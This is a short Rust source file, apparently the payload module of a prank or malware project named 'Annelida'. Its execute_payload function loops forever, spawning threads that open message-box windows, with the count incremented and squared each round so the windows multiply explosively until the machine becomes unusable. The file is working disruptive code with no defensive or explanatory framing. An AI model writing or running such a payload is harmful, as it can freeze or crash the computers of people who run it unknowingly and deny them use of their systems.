use std::thread;
use std::time::Duration;
use native_dialog::{MessageDialog, MessageType};

// Function to exponentially increase the number of windows that open
pub fn execute_payload() {
    let mut count: i32 = 1;
    loop {
        for _ in 1..count {
            thread::spawn(|| {
                message();
            });
        }
        count+=1;
        count*=count;
        thread::sleep(Duration::from_secs_f32(0.5));
    }
}

// Simple message box window with message for payload
fn message() {
    MessageDialog::new()
        .set_type(MessageType::Info)
        .set_title("Annelida")
        .set_text("Temporary payload message :3")
        .show_alert().unwrap();
}